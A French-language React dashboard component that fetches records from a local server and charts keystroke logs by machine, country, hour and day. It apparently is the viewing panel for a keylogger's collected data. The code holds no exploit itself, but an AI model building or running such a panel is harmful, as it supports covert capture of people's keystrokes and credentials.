import React, { useEffect, useState } from 'react';
import {
  LineChart, Line, XAxis, YAxis, Tooltip, ResponsiveContainer,
  PieChart, Pie, Cell, Legend, BarChart, Bar
} from 'recharts';
import './Dashboard.css';
import { io } from "socket.io-client";

const COLORS = ['#00c0ff', '#00e676', '#ffea00', '#ff5722', '#ff4081', '#7c4dff'];

function Dashboard() {
  const [data, setData] = useState([]);
  const [filteredData, setFilteredData] = useState([]);
  const [filter, setFilter] = useState("all");
  const [clientCount, setClientCount] = useState(0);
  const [isLoading, setIsLoading] = useState(true);

  // WebSocket
  useEffect(() => {
    const socket = io("http://localhost:3001");
    socket.on("update_clients", (count) => setClientCount(count));
    return () => socket.disconnect();
  }, []);

  // Fetch des données
  useEffect(() => {
    setIsLoading(true);
    fetch("http://localhost:3001/api/data")
      .then(res => res.json())
      .then(json => {
        console.log("✅ Données brutes reçues :", json); // ✅ ici json est défini
        setData(Array.isArray(json) ? json : []);
      })
      .catch(err => {
        console.error("❌ Erreur lors du chargement des données :", err);
        setData([]);
      })
      .finally(() => setIsLoading(false));
  }, []);
  

  useEffect(() => {
    const now = new Date();
    const filtered = data.filter(d => {
      const date = new Date(d.timestamp);
      if (filter === "today") return date.toDateString() === now.toDateString();
      if (filter === "week") return now - date <= 7 * 24 * 60 * 60 * 1000;
      return true;
    });
    setFilteredData(filtered);
  }, [data, filter]);

  const total = filteredData.length;
  const countries = [...new Set(filteredData.map(v => v.country))];
  const totalLogs = filteredData.reduce((sum, v) => sum + (v.keystrokes?.length || 0), 0);
  const lastDate = filteredData.length > 0 ? filteredData[filteredData.length - 1].timestamp : "–";

  const graphData = filteredData.reduce((acc, curr) => {
    const time = new Date(curr.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const existing = acc.find(a => a.time === time);
    const logs = curr.keystrokes?.length || 0;
    if (existing) existing.logs += logs;
    else acc.push({ time, logs });
    return acc;
  }, []);

  const pieData = countries.map(country => {
    const value = filteredData
      .filter(d => d.country === country)
      .reduce((sum, d) => sum + (d.keystrokes?.length || 0), 0);
    return { name: country, value };
  });

  const logsByDay = filteredData.reduce((acc, curr) => {
    const day = new Date(curr.timestamp).toLocaleDateString("fr-FR");
    const logCount = curr.keystrokes?.length || 0;
    const existing = acc.find(e => e.date === day);
    if (existing) existing.count += logCount;
    else acc.push({ date: day, count: logCount });
    return acc;
  }, []);

  return (
    <div className="dashboard">
      <h2 className="title">Dashboard</h2>

      {isLoading ? (
        <div className="spinner-container">
          <div className="spinner"></div>
          <p>Chargement des données...</p>
        </div>
      ) : (
        <>
          <div className="filters">
            <button onClick={() => setFilter("all")} className={filter === "all" ? "active" : ""}>Tous</button>
            <button onClick={() => setFilter("today")} className={filter === "today" ? "active" : ""}>Aujourd'hui</button>
            <button onClick={() => setFilter("week")} className={filter === "week" ? "active" : ""}>Cette semaine</button>
          </div>

          <div className="cards">
            <div className="card"><h3>🖥️ Machines</h3><p>{total}</p></div>
            <div className="card"><h3>🌍 Pays</h3><p>{countries.length}</p></div>
            <div className="card"><h3>⌨️ Logs</h3><p>{totalLogs}</p></div>
            <div className="card"><h3>🕒 Dernier</h3><p>{lastDate}</p></div>
            <div className="card"><h3>👥 Connexions actives</h3><p>{clientCount}</p></div>
          </div>

          <div className="charts">
            <div className="chart-box">
              <h3>📈 Logs par heure</h3>
              <ResponsiveContainer width="100%" height={300}>
                <LineChart data={graphData}>
                  <XAxis dataKey="time" />
                  <YAxis />
                  <Tooltip />
                  <Line type="monotone" dataKey="logs" stroke="#00c0ff" strokeWidth={2} />
                </LineChart>
              </ResponsiveContainer>
            </div>

            <div className="chart-box">
  <h3>🧩 Logs par pays</h3>
  <ResponsiveContainer width="100%" height={400}>
    <PieChart>
      <Pie
        data={pieData}
        dataKey="value"
        nameKey="name"
        outerRadius={120}
        labelLine={false}
        label={({ value }) => `${value}`}
      >
        {pieData.map((entry, index) => (
          <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
        ))}
      </Pie>
      <Legend
        layout="horizontal"
        verticalAlign="bottom"
        align="center"
        wrapperStyle={{
          fontSize: "12px",
          maxWidth: "100%",
          overflowX: "auto",
          color: "#fff",
        }}
      />
      <Tooltip />
    </PieChart>
  </ResponsiveContainer>
</div>


            <div className="chart-box">
              <h3>📆 Logs par jour</h3>
              <ResponsiveContainer width="100%" height={300}>
                <BarChart data={logsByDay}>
                  <XAxis dataKey="date" />
                  <YAxis />
                  <Tooltip />
                  <Bar dataKey="count" fill="#00e676" />
                </BarChart>
              </ResponsiveContainer>
            </div>
          </div>
        </>
      )}
    </div>
  );
}

export default Dashboard;
